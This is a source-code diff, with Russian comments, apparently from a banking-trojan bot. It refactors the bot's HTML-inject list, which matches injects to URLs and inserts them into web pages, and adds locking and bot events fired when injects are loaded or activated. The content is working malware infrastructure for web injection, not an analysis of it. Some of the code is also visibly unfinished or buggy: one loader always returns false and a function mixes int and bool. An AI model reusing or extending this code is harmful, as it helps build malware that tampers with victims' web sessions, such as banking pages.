@@ -10,6 +10,7 @@
 #include "Crypt.h"
 #include "BotUtils.h"
 #include "Loader.h"
+#include "BotDef.h"
 
 #include "Modules.h"
 
@@ -1029,28 +1030,18 @@ bool HTMLInjects::SupportContentType(PCHAR CType) {
 //*****************************************************************************
 
 THTMLInjectList::THTMLInjectList()
+    : TBotCollection(), TEventContainer()
 {
-	FInjects = List::Create();
-	pInitializeCriticalSection(&FLock);
+	// Включаем потоко-защищённый режим
+	SetThreadSafe();
 }
 
 THTMLInjectList::~THTMLInjectList()
 {
-	Clear();
-	List::Free(FInjects);
+
 }
 
 
-void THTMLInjectList::Lock()
-{
-	pEnterCriticalSection(&FLock);
-}
-
-
-void THTMLInjectList::Unlock()
-{
-	pLeaveCriticalSection(&FLock);
-}
 
 THTMLInject* THTMLInjectList::AddInject()
 {
@@ -1060,6 +1051,9 @@ THTMLInject* THTMLInjectList::AddInject()
 
 void THTMLInjectList::ResetInjectsStatus()
 {
+	// Функция сбрасывает статус инжектов
+	TLock L = GetLocker();
+
 	int C = Count();
 	for (int i = 0; i < C; i++)
 	{
@@ -1072,25 +1066,16 @@ void THTMLInjectList::ResetInjectsStatus()
 	}
 }
 
-void THTMLInjectList::Clear()
-{
-	// Функция очищает список инжектов
-	for (DWORD i = List::Count(FInjects); i > 0; i--)
-		delete (THTMLInject*)List::GetItem(FInjects, i);
-
-}
-
 
 bool THTMLInjectList::LoadFromMem(LPVOID Buf, DWORD BufSize)
 {
 	// Читаем инжекты из блока памяти
 
 	// Входим в критическую секцию
-	TLock Lock(&FLock);
+	TLock L = GetLocker();
 
 	//------------------------------------
-	Clear();
-	if (!Buf || !BufSize) return false;
+	Clear();;
 
     return false;
 	//------------------------------------
@@ -1098,30 +1083,38 @@ bool THTMLInjectList::LoadFromMem(LPVOID Buf, DWORD BufSize)
 }
 
 
+void THTMLInjectList::Clear()
+{
+	// Очистку списка проводим с учётом того, что инжекты в данный момент
+	// могут использоваться в запросах. По этому извлекаем их из коллекции
+	// и уменьшаем счётчик ссылок
+
+	TLock L = GetLocker();
+
+    CallEvent(BOT_EVENT_HTMLINJECTS_CLEAR);
+
+	while (Count())
+	{
+		THTMLInject *Item = Items(0);
+		Item->SetOwner(NULL);
+		Item->Release();
+    }
+}
+
+
 void THTMLInjectList::ReleaseInjects(PList Injects)
 {
 	// Функция освобождает список инжектов
-	if (!Injects)
-		Injects = FInjects;
-
-	bool IsSelfList = Injects == FInjects;
+	if (!Injects) return;
 
     // Входим в критическую секцию
-	TLock Lock(&FLock);
+	TLock L = GetLocker();
 	//----------------------------
 
-
-	for (DWORD i = List::Count(Injects); i > 0; i--)
+	int Cnt = List::Count(Injects);
+	for (DWORD i = 0; i < Cnt; i++)
 	{
-		THTMLInject *Inject = (THTMLInject*)List::GetItem(Injects, i);
-		if (!Inject) break;
-
-		// Если удаляется из собственного списка то
-		// обнуляем владельца
-		if (IsSelfList)
-            Inject->FOwner = NULL;
-
-        Inject->Release();
+		((THTMLInject*)List::GetItem(Injects, i))->Release();;
 	}
 
 	List::Clear(Injects);
@@ -1142,7 +1135,7 @@ bool THTMLInjectList::GetInjectsForURL(THTTPMethod Method, const char *URL, PLis
     bool Result = false;
 
 	// Входим в критическую секцию
-	TLock Lock(&FLock);
+	TLock L = GetLocker();
 
 	//-----------------------------
 
@@ -1170,7 +1163,8 @@ bool THTMLInjectList::GetInjectsForURL(THTTPMethod Method, const char *URL, PLis
 			if (List == NULL) break;
 
 			// Добавляем в список
-			Inject->Used = true;
+			Inject->Activated = true;
+			Inject->CallEvent(BOT_EVENT_HTMLINJECT_ACTIVATED);
 
 			List::Add(List, Inject);
 			Inject->AddRef();
@@ -1215,20 +1209,15 @@ bool THTMLInjectList::IsInjectURL(const char* URL, THTTPMethod Method)
 
 
 THTMLInject::THTMLInject(THTMLInjectList *aOwner)
+	: TBotCollectionItem(aOwner), TEventContainer()
 {
-	FOwner = aOwner;
-	if (FOwner)
-		List::Add(FOwner->FInjects, this);
-	FInjects = List::Create();
+	FItems    = new TBotCollection();
 	FRefCount = 1;
 }
 
 THTMLInject::~THTMLInject()
 {
-	if (FOwner)
-		List::Remove(FOwner->FInjects, this);
-    Clear();
-	List::Free(FInjects);
+	delete FItems;
 }
 
 
@@ -1247,16 +1236,26 @@ void THTMLInject::Release()
 }
 
 
+
 THTMLInjectData* THTMLInject::AddData()
 {
 	return new THTMLInjectData(this);
 }
 
-void THTMLInject::Clear()
+// Функция возвращает истину если хотя-бы в одном инжекте
+// содержится имя переменной
+int THTMLInject::ContainVariable(const char* VarName)
 {
-	// Функция очищает список инжектов
-	for (DWORD i = List::Count(FInjects); i > 0; i--)
-		delete (THTMLInjectData*)List::GetItem(FInjects, i);
+	DWORD Count = FItems->Count();
+	for (int i = 0; i < Count; i++)
+	{
+		THTMLInjectData* D = Items(i);
+		if (D->Before.Pos(VarName) >= 0 ||
+			D->Inject.Pos(VarName) >= 0 ||
+			D->After.Pos(VarName) >= 0 ) return true;
+	}
+
+	return false;
 }
 
 //*****************************************************************************
@@ -1264,18 +1263,12 @@ void THTMLInject::Clear()
 //*****************************************************************************
 
 THTMLInjectData::THTMLInjectData(THTMLInject *aOwner)
+	: TBotCollectionItem(NULL), TEventContainer()
 {
 	FOwner = aOwner;
 	if (FOwner)
-		List::Add(FOwner->FInjects, this);
+		SetOwner(FOwner->FItems);
 }
-
-THTMLInjectData::~THTMLInjectData()
-{
-	if (FOwner)
-		List::Remove(FOwner->FInjects, this);
-}
-
 
 void THTMLInjectData::Copy(const THTMLInjectData &Data)
 {
@@ -1310,7 +1303,6 @@ TBotConfig::TBotConfig()
 	HTMLInjects = new THTMLInjectList();
 }
 
-
 TBotConfig::~TBotConfig()
 {
 	delete HTMLInjects;
@@ -1329,7 +1321,7 @@ bool TBotConfig::LoadFromFile(const string &FileName)
 	// Функция загружает настройки из файла
 
 	// Входим в критичскую секцию
-    TLock Lock(&HTMLInjects->FLock);
+    TLock Lock = HTMLInjects->GetLocker();
 	//------------------------------
 
 	Clear();
@@ -1347,6 +1339,9 @@ bool TBotConfig::LoadFromFile(const string &FileName)
 
 	// Освобождаем память
 	MemFree(Buf);
+
+	// Вызываем событие
+    HTMLInjects->CallEvent(BOT_EVENT_HTMLINJECTS_LOADED);
 
 	return Result;
 
